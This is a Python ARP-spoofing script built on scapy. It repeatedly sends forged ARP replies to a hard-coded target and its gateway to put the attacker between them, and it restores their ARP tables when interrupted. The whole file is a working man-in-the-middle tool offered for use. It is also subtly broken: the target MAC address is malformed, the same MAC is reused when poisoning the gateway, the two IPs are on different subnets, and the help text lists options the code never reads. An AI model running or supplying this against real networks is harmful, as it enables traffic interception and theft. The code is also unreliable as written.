import scapy.all as scapy
import sys
import time


target_ip = "10.42.0.116"  # Enter your target IP
target_mac = "82::10::61::18::72::1c"
gateway_ip = "192.168.1.1"  # Enter your gateway's IP


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def main():
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent " + str(sent_packets_count), end="")
            time.sleep(2)  # Waits for two seconds

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "-h" or sys.argv[1] == "--help":
            print("usage:\n     ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET")
            print("\nSpoof ARP tables\noptional arguments:")
            print("-h, --help                      show this help message and exit")
            print(" -i IFACE, --iface IFACE        Interface you wish to use")
            print(" -s SRC, --src SRC              The address you want for the attacker")
            print(" -d DELAY, --delay DELAY        Delay (in seconds) between messages")
            print(" -gw                            should GW be attacked as well")
            print(" -t TARGET, --target TARGET     IP of target")
            exit()

    main()
